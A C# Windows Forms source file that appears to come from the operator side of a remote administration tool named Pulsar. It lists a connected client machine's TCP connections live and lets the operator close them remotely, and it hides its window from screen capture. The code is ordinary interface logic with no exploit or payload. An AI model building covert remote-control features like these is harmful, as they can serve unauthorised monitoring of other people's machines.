using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmConnections : Form
    {
        private readonly Client _connectClient;
        private readonly TcpConnectionsHandler _connectionsHandler;
        private readonly Dictionary<string, ListViewGroup> _groups = new();
        private static readonly Dictionary<Client, FrmConnections> OpenedForms = new();

        private readonly string _clientAddress;
        private readonly int _clientPort;

        private readonly Timer _refreshTimer;

        public static FrmConnections CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
                return OpenedForms[client];

            FrmConnections f = new(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmConnections(Client client)
        {
            _connectClient = client;
            _connectionsHandler = new TcpConnectionsHandler(client);

            if (client.EndPoint is IPEndPoint endPoint)
            {
                _clientAddress = endPoint.Address.ToString();
                _clientPort = endPoint.Port;
            }
            else
            {
                _clientAddress = string.Empty;
                _clientPort = -1;
            }

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            // ⏱️ Setup live refresh (like Task Manager)
            _refreshTimer = new Timer { Interval = 2000 }; // refresh every 2s
            _refreshTimer.Tick += (s, e) => _connectionsHandler.RefreshTcpConnections();
            _refreshTimer.Start();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _connectionsHandler.ProgressChanged += TcpConnectionsChanged;
            MessageHandler.Register(_connectionsHandler);
        }

        private void UnregisterMessageHandler()
        {
            _refreshTimer?.Stop();
            MessageHandler.Unregister(_connectionsHandler);
            _connectionsHandler.ProgressChanged -= TcpConnectionsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                this.Invoke((MethodInvoker)this.Close);
        }
        private bool _initialLoad = true;

        private void TcpConnectionsChanged(object sender, TcpConnection[] connections)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<object, TcpConnection[]>(TcpConnectionsChanged), sender, connections);
                return;
            }

            lstConnections.BeginUpdate();

            var existing = lstConnections.Items.Cast<ListViewItem>()
                .ToDictionary(x => GetKey(x), x => x);

            var seen = new HashSet<string>();

            foreach (var con in connections)
            {
                string key = GetKey(con);
                seen.Add(key);
                string state = con.State.ToString();

                if (!_groups.ContainsKey(state))
                {
                    var g = new ListViewGroup(state, state);
                    lstConnections.Groups.Add(g);
                    _groups[state] = g;
                }

                if (existing.TryGetValue(key, out var item))
                {
                    // Update existing item state
                    item.SubItems[5].Text = state;
                }
                else
                {
                    // New connection
                    var lvi = new ListViewItem(new[]
                    {
                con.ProcessName,
                con.LocalAddress,
                con.LocalPort.ToString(),
                con.RemoteAddress,
                con.RemotePort.ToString(),
                state
            });

                    // ✅ Keep client’s own connection green
                    if (!string.IsNullOrEmpty(_clientAddress) &&
                        string.Equals(con.LocalAddress, _clientAddress, StringComparison.OrdinalIgnoreCase) &&
                        con.LocalPort == _clientPort)
                    {
                        lvi.ForeColor = Color.MediumSeaGreen;
                        lvi.Font = new Font(lstConnections.Font, FontStyle.Bold);
                    }
                    else if (!_initialLoad)
                    {
                        // 🔵 Flash new connections for 2 seconds (was 800ms)
                        lvi.ForeColor = Color.LightSkyBlue;
                        var timer = new Timer { Interval = 2000, Tag = lvi };
                        timer.Tick += (s, e2) =>
                        {
                            timer.Stop();
                            timer.Dispose();
                            if (lstConnections.Items.Contains(lvi))
                                lvi.ForeColor = lstConnections.ForeColor;
                        };
                        timer.Start();
                    }

                    lvi.Group = _groups[state];
                    lstConnections.Items.Add(lvi);
                }
            }

            // 🔴 Flash red before removal
            var toRemove = lstConnections.Items.Cast<ListViewItem>()
                .Where(i => !seen.Contains(GetKey(i)))
                .ToList();

            foreach (var item in toRemove)
            {
                if (item.ForeColor == Color.MediumSeaGreen)
                    continue;

                item.ForeColor = Color.IndianRed;

                var timer = new Timer { Interval = 800, Tag = item };
                timer.Tick += (s, e2) =>
                {
                    timer.Stop();
                    timer.Dispose();
                    if (lstConnections.Items.Contains(item))
                        lstConnections.Items.Remove(item);
                };
                timer.Start();
            }

            lstConnections.EndUpdate();
            _initialLoad = false;
        }

        private static string GetKey(TcpConnection con) =>
            $"{con.LocalAddress}:{con.LocalPort}-{con.RemoteAddress}:{con.RemotePort}";

        private static string GetKey(ListViewItem item) =>
            $"{item.SubItems[1].Text}:{item.SubItems[2].Text}-{item.SubItems[3].Text}:{item.SubItems[4].Text}";

        private void FrmConnections_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Connections", _connectClient);
            _connectionsHandler.RefreshTcpConnections();
        }

        private void FrmConnections_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectionsHandler.RefreshTcpConnections();
        }

        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            bool modified = false;

            foreach (ListViewItem lvi in lstConnections.SelectedItems)
            {
                _connectionsHandler.CloseTcpConnection(
                    lvi.SubItems[1].Text,
                    ushort.Parse(lvi.SubItems[2].Text),
                    lvi.SubItems[3].Text,
                    ushort.Parse(lvi.SubItems[4].Text));

                modified = true;
            }

            if (modified)
                _connectionsHandler.RefreshTcpConnections();
        }

        private void lstConnections_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            lstConnections.LvwColumnSorter.NeedNumberCompare = (e.Column == 2 || e.Column == 4);
        }
    }
}
